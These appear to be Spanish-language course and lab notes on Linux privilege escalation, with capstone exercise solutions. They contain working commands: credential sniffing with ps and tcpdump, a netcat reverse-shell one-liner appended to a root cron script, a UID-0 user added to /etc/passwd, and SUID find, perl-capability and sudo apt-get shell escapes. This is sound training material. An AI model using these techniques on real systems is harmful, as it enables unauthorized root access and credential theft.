Podemos enumerar todos los procesos en ejecución con el comando _ps_ y, dado que solo toma una instantánea de los procesos activos, podemos actualizarla con el comando _watch ._ En el siguiente ejemplo, ejecutaremos el comando **ps** cada segundo a través de la utilidad **watch** y **grep** los resultados en cualquier aparición de la palabra "aprobado".

```
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
...

joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
...
```

En el anterior , notamos que el administrador configuró un demonio del sistema que se conecta al sistema local con las credenciales de Eve en texto sin cifrar. Lo más importante es que el hecho de que el proceso se ejecute como _root_ no nos impide inspeccionar su actividad.

<br />

**TCPDump**

Otro ángulo más holístico que debemos tener en cuenta al enumerar la escalada de privilegios es verificar si tenemos derechos para capturar el tráfico de red.

_tcpdump_ es el estándar de línea de comandos de facto para la captura de paquetes y requiere acceso administrativo ya que opera en sockets sin formato. Sin embargo, no es raro encontrar que las cuentas del personal de TI tienen acceso exclusivo a esta herramienta para solucionar problemas.

Para ilustrar el concepto, podemos ejecutar tcpdump como el usuario _joe_ al que se le han otorgado permisos específicos de sudo para ejecutarlo.

tcpdump no se puede ejecutar sin permisos sudo. Esto se debe a que necesita configurar sockets sin formato para capturar el tráfico, que es una operación privilegiada.

Intentemos capturar el tráfico de entrada y salida de la interfaz de loopback, luego volcar su contenido en ASCII usando el parámetro **-A .** En última instancia, queremos filtrar cualquier tráfico que contenga la palabra clave "aprobar".

```
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
[sudo] password for joe:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```

Después de unos segundos, se nos solicitan las credenciales de texto no cifrado del usuario raíz. ¡Lindo!

Estos dos ejemplos proporcionan un punto de entrada para las muchas vías disponibles cuando se buscan credenciales filtradas. Habiendo cubierto la fruta al alcance de la mano, a continuación exploraremos cómo aumentar los privilegios a través de permisos de archivo mal configurados.

#### 3.3. Insecure File Permissions.

##### 3.3.1. Abusing Cron Jobs.

Centrémonos en otra familia de técnicas de escalada de privilegios y aprendamos cómo aprovechar los permisos de archivos inseguros. Para esta sección, supondremos que ya hemos obtenido acceso a nuestra máquina de destino Linux como usuario sin privilegios.

Para aprovechar los permisos de archivos inseguros, debemos ubicar un archivo ejecutable que no solo nos permita acceso de escritura, sino que también se ejecute en un nivel de privilegio elevado. En un sistema Linux, el programador de trabajos basado en el tiempo cron es un objetivo principal, ya que los trabajos programados a nivel del sistema se ejecutan con privilegios de usuario raíz y los administradores del sistema a menudo crean scripts para trabajos cron con permisos inseguros.

Para este ejemplo, usaremos SSH en la VM 1 como el usuario _joe_ , proporcionando _offsec_ como contraseña. En una sección anterior, demostramos dónde verificar el sistema de archivos para trabajos cron instalados en un sistema de destino. También podríamos inspeccionar el archivo de registro cron ( **/var/log/cron.log** ) para ejecutar trabajos cron:

```
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

Parece que un script llamado **user_backups.sh** en **/home/joe/** se ejecuta en el contexto del usuario raíz. A juzgar por las marcas de tiempo, parece que este trabajo se ejecuta una vez por minuto.

Dado que conocemos la ubicación del script, podemos inspeccionar su contenido y permisos.

```
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```

El script en sí es bastante sencillo: simplemente copia el directorio **de inicio** del usuario en el subdirectorio **de copias de seguridad** . Los permisos del script revelan que todos los usuarios locales pueden escribir en el archivo.

Dado que un usuario sin privilegios puede modificar el contenido del script de copia de seguridad, podemos editarlo y agregar un shell inverso de _una sola línea_. Si nuestro plan funciona, deberíamos recibir un shell inverso de nivel raíz en nuestra máquina atacante después de, como máximo, un período de un minuto.

```
joe@debian-privesc:~$ cd .scripts

joe@debian-privesc:~/.scripts$ echo >> user_backups.sh

joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh

joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

Todo lo que tenemos que hacer ahora es configurar un oyente en nuestra máquina Kali Linux y esperar a que se ejecute el trabajo cron:

```
kali@kali:~$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Como se muestra en la lista anterior, el trabajo cron se ejecutó, así como el shell inverso de una sola línea. Hemos elevado con éxito nuestros privilegios y tenemos acceso a un shell raíz en el objetivo.

Si bien este fue un ejemplo simple, no es raro encontrar situaciones similares en el campo, ya que los administradores a menudo se concentran más en impulsar los sistemas a la producción en lugar de asegurar los permisos de los archivos de secuencias de comandos.

<br />

##### 3.3.2. Abusing Password Authentication.

A menos que se utilice un sistema de credenciales centralizado como Active Directory o LDAP, las contraseñas de Linux generalmente se almacenan en **/etc/shadow** , que los usuarios normales no pueden leer. Históricamente, sin embargo, los hashes de contraseña, junto con otra información de la cuenta, se almacenaban en el archivo de lectura mundial **/etc/passwd** . Para compatibilidad con versiones anteriores, si un hash de contraseña está presente en la segunda columna de un registro de usuario **/etc/passwd** , se considera válido para la autenticación y tiene prioridad sobre la entrada respectiva en **/etc/shadow** , si está disponible. Esto significa que si podemos escribir en **/etc/passwd** , podemos establecer efectivamente una contraseña arbitraria para cualquier cuenta.

Demostremos esto. En una sección anterior, mostramos que nuestro cliente Debian puede ser vulnerable a la escalada de privilegios debido a que los permisos **/etc/passwd** no se configuraron correctamente. Para escalar nuestros privilegios, agreguemos otro superusuario (root2) y el hash de contraseña correspondiente a **/etc/passwd** . Primero generaremos el hash de la contraseña usando la herramienta **openssl** y el argumento **passwd** . De manera predeterminada, si no se especifica otra opción, openssl generará un hash utilizando el _algoritmo de cifrado_ , un mecanismo de hash admitido para la autenticación de Linux.

La salida del comando _passwd_ de OpenSSL puede variar según el sistema que lo ejecute. En los sistemas más antiguos, es posible que utilice de manera predeterminada el algoritmo DES, mientras que en algunos sistemas más nuevos podría generar la contraseña en formato MD5.

Una vez que tengamos el hash generado, agregaremos una línea a **/etc/passwd** usando el formato apropiado:

```
joe@debian-privesc:~$ openssl passwd w00
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00

root@debian-privesc:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)
```

Como se muestra en el Listado 37, el usuario _root2_ y el hash de contraseña _w00t_ en nuestro registro **/etc/passwd** fueron seguidos por el id de usuario (UID) cero y el id de grupo (GID) cero. Estos valores cero especifican que la cuenta que creamos es una cuenta Linux de superusuario. Finalmente, para verificar que nuestras modificaciones fueran válidas, usamos **su para cambiar nuestro usuario estándar a la cuenta** _root2_ recién creada , luego emitimos el comando **id** para mostrar que efectivamente tenemos privilegios _de root_ .

Aunque parezca poco probable encontrar **/etc/passwd** world-writable, muchas organizaciones implementan integraciones híbridas con proveedores externos que pueden comprometer la seguridad para facilitar el uso.

<br />

#### 3.4. Insecure System Components.

##### 3.4.1. Abusing Setuid Binaries and Capabilities.

Como anticipamos anteriormente en este módulo, cuando no se protegen adecuadamente, los binarios setuid pueden generar ataques que elevan los privilegios.

Antes de intentar la técnica de explotación real, revisemos el propósito detrás de un binario setuid usando un breve ejemplo. Cuando un usuario o un script automatizado por el sistema inicia un proceso, hereda el UID/GID de su script de inicio: esto se conoce como el UID/GID real.

Como se discutió anteriormente, las contraseñas de los usuarios se almacenan como hashes dentro de **/etc/shadow** , que es propiedad y solo puede ser escrito por root (uid=0). Entonces, ¿cómo pueden los usuarios sin privilegios acceder a este archivo para cambiar su propia contraseña?

Para sortear este problema, se introdujo el UID/GID efectivo, que representa el valor real que se verifica al realizar operaciones confidenciales.

Para demostrar mejor este concepto, analicemos el programa _passwd_ , que se encarga de cambiar la contraseña del usuario que lo ejecuta. En la máquina de laboratorio de Debian, nos conectaremos como _joe_ y ejecutaremos el comando **passwd** sin escribir nada después, para que el proceso permanezca activo en la memoria.

```
joe@debian-privesc:~$ passwd
Changing password for joe.
Current password:
```

Dejando el programa en espera, abramos otro shell como _joe_ para inspeccionar más el proceso.

Para encontrar el PID (ID de proceso) del programa passwd, podemos enumerar todos los procesos y filtrar la salida según el nombre del objetivo:

```
joe@debian-privesc:~$ ps u -C passwd
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      1932  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
```

Curiosamente, passwd se ejecuta como usuario raíz: esto es necesario para acceder y modificar **/etc/shadow** .

También podemos inspeccionar el UID real y el UID efectivo asignado para el proceso al inspeccionar el pseudo-sistema de archivos _proc_ , que nos permite interactuar con la información del kernel. Usando el PID de passwd (1932) del resultado anterior, inspeccionemos el contenido en **/proc/1932/status** , que proporciona un resumen de los atributos del proceso:

```
joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid:	1000	0	0	0
```

Filtrar por la palabra clave "Uid" devuelve cuatro parámetros que corresponden a los UID reales, efectivos, guardados y del sistema de archivos. En este caso, el valor de Real UID es 1000, lo que se espera ya que pertenece a _joe_ . Sin embargo, los otros tres valores, incluido el UID efectivo, equivalen al ID de raíz 0: consideremos por qué.

En circunstancias normales, los cuatro valores pertenecerían al mismo usuario que lanzó el ejecutable. Por ejemplo, el proceso bash para _joe_ (PID 1131 en este caso) tiene los siguientes valores:

```
joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
Uid:	1000	1000	1000	1000
```

El binario _passwd_ se comporta de manera diferente porque el programa binario tiene un indicador especial llamado Set-User-ID, o SUID en resumen. Inspeccionémoslo:

```
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
```

El indicador SUID se representa con el indicador **s** en el resultado anterior. Este indicador se puede configurar con el comando 

```
chmod u+s <nombre de archivo>
```

y establece el UID efectivo del proceso en ejecución en el ID de usuario del propietario del ejecutable, en este caso, el de root.

El uso de esta técnica da como resultado una escalada de privilegios legítima y restringida y debido a esto (como veremos en breve), el binario SUID debe estar libre de errores para evitar cualquier uso indebido de la aplicación.

Como ejemplo práctico, una vez que hayamos completado la enumeración manual o automática, habremos descubierto que la utilidad de _búsqueda_ está mal configurada y tiene el indicador SUID establecido.

Podemos abusar rápidamente de esta vulnerabilidad ejecutando el programa _de búsqueda_ para buscar cualquier archivo conocido, como nuestra propia carpeta de escritorio. Una vez que se encuentra el archivo, podemos indicarle a _find_ que realice cualquier acción a través del parámetro _-exec_ . En este caso, queremos ejecutar un shell bash junto con el parámetro *Set Builtin* _-p_ que impide que se restablezca el usuario efectivo.

```
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
bash-5.0# whoami
roo
```

Después de ejecutar el comando, hemos obtenido un shell de root y observaremos que, aunque el UID todavía pertenece a _joe_ , el ID de usuario efectivo es de _root_ .

Otro conjunto de funciones sujetas a técnicas de escalada de privilegios son las capabilities de Linux.

Las capabilities son atributos adicionales que se pueden aplicar a procesos, archivos binarios y servicios para asignar privilegios específicos que normalmente se reservan para operaciones administrativas, como la captura de tráfico o la adición de módulos de kernel. De manera similar a los binarios setuid, si están mal configurados, estas capacidades podrían permitir que un atacante eleve sus privilegios a root.

Para demostrar estos riesgos, intentemos enumerar manualmente nuestro sistema de destino para binarios con capacidades. Vamos a ejecutar **getcap** con el parámetro **-r** para realizar una búsqueda recursiva a partir de la carpeta raíz **/** , filtrando cualquier error de la salida del terminal.

```
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Los dos binarios _de perl_ se destacan porque tienen capacidades _setuid_ habilitadas, junto con el indicador _+ep_ que especifica que estas capacidades son _efectivas_ y _están permitidas_ .

Aunque parecen similares, las capacidades, el setuid y el indicador setuid se encuentran en diferentes lugares dentro del formato de archivo ELF de Linux.

Para explotar esta configuración incorrecta de la capacidad, podríamos consultar el sitio web _de GTFOBins_ . Este sitio proporciona una lista organizada de binarios de UNIX y cómo se pueden utilizar indebidamente para elevar nuestros privilegios.

Al buscar "Perl" en el sitio web de GTFOBins, encontraremos instrucciones precisas sobre qué comando usar para explotar las capacidades. Usaremos el comando completo, que ejecuta un shell junto con algunas directivas POSIX que habilitan setuid.

```
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
perl: warning: Setting locale failed.
...
# id
uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

¡Excelente! Logramos obtener un shell raíz a través de otro vector de configuración incorrecta.

<br />

##### 3.4.2. Abusing Sudo.

En los sistemas UNIX, la utilidad sudo se puede usar para ejecutar un comando con privilegios elevados. Para poder usar sudo, nuestra cuenta de usuario con privilegios bajos debe ser miembro del grupo sudo (en distribuciones de Linux basadas en Debian). La palabra "sudo" significa "Superuser-Do", y podemos pensar que cambia la identificación de usuario efectiva del comando ejecutado.

Las configuraciones personalizadas de los permisos relacionados con sudo se pueden aplicar en el archivo **/etc/sudoers** .  Podemos usar la opción **-l** o **--list** para enumerar los comandos permitidos para el usuario actual.

```
joe@debian-privesc:~$ sudo -l
[sudo] password for joe:
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```

A partir de la salida en el listado 46, notamos que solo las utilidades crontab jobs, tcpdump y apt-get se enumeran como permitiendo comandos _sudo ._

Si las configuraciones **de /etc/sudoers** son demasiado permisivas, un usuario podría abusar del derecho administrativo de corta duración para obtener acceso raíz permanente.

Dado que el primero de los tres comandos permitidos no nos permite editar ningún crontab, es poco probable que podamos usar esto para encontrar una ruta de escalada. El segundo comando parece más prometedor, así que exploremos GTFObins para obtener sugerencias sobre cómo abusar de él.

Sin embargo, ejecutar los comandos sugeridos revela un resultado inesperado:

```
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
[sudo] password for joe:
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
```

Sorprendentemente, una vez que hemos ejecutado el conjunto de comandos sugerido, aparece un mensaje de error de "permiso denegado".

Para investigar más a fondo al culpable, podemos inspeccionar el archivo **syslog en busca de cualquier ocurrencia de la palabra clave** _tcpdump_ .

```
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
...
Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```

El resultado del Listado 48 muestra que el demonio _de auditoría_ ha registrado nuestro intento de escalada de privilegios. Una inspección más cercana revela que _AppArmor_ se activó y nos bloqueó.

AppArmor es un módulo del kernel que proporciona control de acceso obligatorio (MAC) en sistemas Linux mediante la ejecución de varios perfiles específicos de la aplicación y está habilitado de forma predeterminada en Debian 10. Podemos verificar el estado de AppArmor como usuario raíz mediante el comando _aa_ - **status** .

```
joe@debian-privesc:~$ su - roo
Password:
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   /usr/bin/evince
   /usr/bin/evince-previewer
   /usr/bin/evince-previewer//sanitized_helper
   /usr/bin/evince-thumbnailer
   /usr/bin/evince//sanitized_helper
   /usr/bin/man
   /usr/lib/cups/backend/cups-pdf
   /usr/sbin/cups-browsed
   /usr/sbin/cupsd
   /usr/sbin/cupsd//third_party
   /usr/sbin/tcpdump
...
2 profiles are in complain mode.
   libreoffice-oopslash
   libreoffice-soffice
3 processes have profiles defined.
3 processes are in enforce mode.
   /usr/sbin/cups-browsed (502)
   /usr/sbin/cupsd (654)
   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```

El Listado 49 confirma que tcpdump está activamente protegido con un perfil de AppArmor dedicado.

Dado que los dos primeros comandos del archivo **sudoers** no funcionaron, examinemos el tercer comando _sudo permitido:_ _apt-get_ . Volviendo de nuevo a GTFOBins, seleccionaremos la primera opción (a). El payload primero ejecuta la opción de comando changelog _apt-get_ , invocando la aplicación _less_ desde la cual podemos ejecutar un shell bash.

```
sudo apt-get changelog apt
!/bin/sh
```

Podemos probar los comandos anteriores como el usuario _joe_ copiándolos en nuestro shell activo.

```
joe@debian-privesc:~$ sudo apt-get changelog apt
...
Fetched 459 kB in 0s (39.7 MB/s)
# id
uid=0(root) gid=0(root) groups=0(root)
```

¡Excelente! Logramos obtener un shell _raíz_ privilegiado al abusar de una configuración sudo mal configurada.

En la sección final, aprenderemos cómo enumerar las vulnerabilidades del kernel de Linux e investigaremos cómo elevar los privilegios a través de ellas.


#### 3.5. Capstone Exercises.

**3. Capstone Exercise: Connect to the VM 3 with the provided credentials and use an appropriate privilege escalation technique to gain a root shell and read the flag.**

We enumerate writeable files:

```
┌──(student㉿05d3375fc8b8)-[~]
└─$ find / -writable -type f 2>/dev/null | grep -vE '^/(home)/'
/var/archives/archive.sh
/proc/keys
/proc/kcore
[...]
```

Then, we examine the *archive.sh*:

```
┌──(student㉿05d3375fc8b8)-[~]
└─$ cat /var/archives/archive.sh
#!/bin/bash

TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/
```

We see that it makes a backup of the content of our user and when we look over the folder we can see that is property of root:

```
┌──(student㉿05d3375fc8b8)-[~]
└─$ ls -la /var/backups/student/                                                                                                              
total 40
drwxr-xr-x 3 root root 4096 Jul  6 06:53 .
drwxr-xr-x 1 root root 4096 Jul  6 06:52 ..
-rw-r--r-- 1 root root  220 Jul  6 06:52 .bash_logout
-rw-r--r-- 1 root root 4365 Jul  6 06:52 .bashrc
-rw-r--r-- 1 root root 3526 Jul  6 06:52 .bashrc.original
-rw-r--r-- 1 root root  807 Jul  6 06:52 .profile
-rw-r--r-- 1 root root 8063 Jul  6 06:52 .zshrc
drwxr-xr-x 2 root root 4096 Jul  6 10:43 student
```


This means that this script is been executed by root through an trigger event (time or initiate session) and we can modify so we have RCE root.

```
┌──(student㉿05d3375fc8b8)-[~]
└─$ echo "cat /root/flag.txt > /home/student/flag.txt;chmod +r /home/student/flag.txt">>/var/archives/archive.sh

┌──(student㉿05d3375fc8b8)-[~]
└─$ cat /var/archives/archive.sh
#!/bin/bash

TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/

cat /root/flag.txt > /home/student/flag.txt;chmod +r /home/student/flag.txt
```

<br />

```
┌──(student㉿05d3375fc8b8)-[~]
└─$ ls                                                                                                                                                      
flag.txt  linpeas.sh
┌──(student㉿05d3375fc8b8)-[~]
└─$ cat flag.txt 
OS{00513bfb0a02ca3a7fcbe51e595b7aed}
```

In an ordinary sceneario we would get a root shell by create a reverse shell (in this case the reverse shell is not the best option because this connection would be terminated in the same instant that the machine kill the process because 'root' finish to run the script) o make a SUID file.

<br />

**4. Capstone Exercise: On the Module Exercise VM 4, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.**

Checkeamos los ficheros sobre los que tenemos permisos de escritura:

```
┌──(student㉿4d956a6c742e)-[~]
└─$ find / -writable -type f 2>/dev/null | grep -v 'proc' | grep -v 'home'

/etc/passwd
```

Como tenemos permisos de escritura sobre /etc/passwd, creamos un hash de contraseña del término 'hello':

```
┌──(kali㉿kali)-[~]
└─$ openssl passwd -1
Password: 
Verifying - Password: 
$1$NHO4wpMA$.T5rlO1HUGKQCQlfmZBRJ1
```

Y de ahí, añadimos un nuevo usuario con uid/gid 0 para emular a root:

```
┌──(student㉿4d956a6c742e)-[~]
└─$ echo "hacker2:\$1\$NHO4wpMA\$.T5rlO1HUGKQCQlfmZBRJ1:0:0::/home/student:/bin/bash">>/etc/passwd                                                                               
┌──(student㉿4d956a6c742e)-[~]
└─$ cat /etc/passwd | grep hacker2
hacker2:$1$NHO4wpMA$.T5rlO1HUGKQCQlfmZBRJ1:0:0::/home/student:/bin/bash

┌──(student㉿4d956a6c742e)-[~]
└─$ su hacker2
Password: 
┌──(root💀4d956a6c742e)-[~]
└─#
```

<br />

**5. Capstone Exercise: Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the Module Exercise VM 5. Binary flags and custom shell are what to look for.**

Enumeramos los binarios SUID.

```
student@7215c55c4bca:/$ find / -perm -u=s -type f 2>/dev/null
[...]
/usr/bin/find
[...]

student@7215c55c4bca:/$ find . -exec /bin/sh -p \; -quit
# whoami
roo
